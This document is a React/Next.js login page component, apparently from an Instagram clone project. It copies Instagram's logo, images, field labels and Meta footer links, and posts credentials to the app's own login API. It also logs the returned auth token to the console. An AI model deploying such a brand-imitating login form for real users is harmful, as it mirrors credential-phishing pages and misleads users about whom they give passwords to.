"use client";

import { useState } from "react";
import styles from "./page.module.css"
import { setAuthToken } from "@/redux/counterSlice";
import { useAppDispatch } from "@/redux/hook";

export default function Login() {

  const dispatch = useAppDispatch();

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");

  return (
    <div style={{ minHeight: "100dvh", display: "flex", flexDirection: "column" }}>
      <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "30px", flex: 1 }}>
        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "30px", border: "1px solid #555", width: "350px", marginTop: "60px" }}>
          <div style={{
            backgroundImage: `url(https://static.cdninstagram.com/rsrc.php/v4/yO/r/81fXxo65t4C.png)`,
            backgroundPosition: "0px -52px",
            backgroundSize: "176px 492px",
            width: "175px",
            height: "51px",
            marginTop: "36px"
          }}>

          </div>
          <div style={{ display: "flex", flexDirection: "column", border: "1px solid #555", width: "268px", borderRadius: "7px", padding: "5px" }}>
            <div>Phone number, Username or Email</div>
            <input
              style={{ backgroundColor: "#ccc", borderRadius: "5px", color: "#000", padding: "5px" }}
              type="text"
              value={username}
              onChange={(e) => setUsername(e.target.value)}
            />
          </div>
          <div style={{ display: "flex", flexDirection: "column", border: "1px solid #555", width: "268px", borderRadius: "7px", padding: "5px" }}>
            <div>Password</div>
            <input
              style={{ backgroundColor: "#ccc", borderRadius: "5px", color: "#000", padding: "5px" }}
              type="password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </div>
          <div style={{ width: "268px" }}>
            <button
              style={{ backgroundColor: "#0095F6", padding: "7px 16px", fontSize: "15px", width: "100%", borderRadius: "8px" }}
              onClick={() => {
                fetch("/api/user/login", {
                  method: "POST",
                  body: JSON.stringify({
                    username: username,
                    password: password
                  })
                })
                .then((res) => res.json())
                .then((data: {message: string, token: string}) => {
                  
                  dispatch(setAuthToken(data.token));
                  console.log(data);

                });
              }}
            >
              Sign In
            </button>
          </div>
          <div>
            --------- OR ---------
          </div>
          <div>
            <div style={{
              backgroundImage: `url(https://commons.wikimedia.org/wiki/File:Facebook_Logo_(2019).png)`,
              backgroundSize: "cover",
              width: "30px"
            }}></div>
            <div>Log in with Facebook</div>
          </div>
          <div>
            Forgot Password?
          </div>
        </div>
        <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "30px", border: "1px solid #555", width: "350px" }}>
          <div style={{ display: "flex", padding: "10px 0" }}>
            <p>Don&apos;t have an Account?</p>
            <a>Sign Up</a>
          </div>
        </div>
        <div style={{ width: "350px", display: "flex", flexDirection: "column", alignItems: "center", gap: "20px" }}>
          <div>Get the app</div>
          <div style={{ display: "flex", gap: "10px" }}>
            <div><img src="https://static.cdninstagram.com/rsrc.php/v4/yt/r/Yfc020c87j0.png" style={{ height: "40px" }} /></div>
            <div><img src="https://static.cdninstagram.com/rsrc.php/v4/yz/r/c5Rp7Ym-Klz.png" style={{ height: "40px" }} /></div>
          </div>
        </div>
      </div>
      <footer className={styles.footer}>
        <a
          href="https://about.meta.com/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Meta
        </a>
        <a
          href="https://about.instagram.com/"
          target="_blank"
          rel="noopener noreferrer"
        >
          About
        </a>
        <a
          href="https://about.instagram.com/blog/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Blog
        </a>
        <a
          href="https://about.instagram.com/about-us/careers"
          target="_blank"
          rel="noopener noreferrer"
        >
          Jobs
        </a>
        <a
          href="https://help.instagram.com/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Help
        </a>
        <a
          href="https://developers.facebook.com/docs/instagram"
          target="_blank"
          rel="noopener noreferrer"
        >
          API
        </a>
        <a
          href="https://www.instagram.com/legal/privacy/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Privacy
        </a>
        <a
          href="https://www.instagram.com/legal/terms/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Terms
        </a>
        <a
          href="https://www.instagram.com/explore/locations/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Locations
        </a>
        <a
          href="https://www.instagram.com/web/lite/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Instagram Lite
        </a>
        <a
          href="https://www.threads.net/"
          target="_blank"
          rel="noopener noreferrer"
        >
          Threads
        </a>
        <a
          href="https://www.facebook.com/help/instagram/261704639352628"
          target="_blank"
          rel="noopener noreferrer"
        >
          Contact Uploading &amp; Non-Users
        </a>
        <a
          href="https://www.instagram.com/accounts/meta_verified/?entrypoint=web_footer"
          target="_blank"
          rel="noopener noreferrer"
        >
          Meta Verified
        </a>
      </footer>
    </div>
  );
}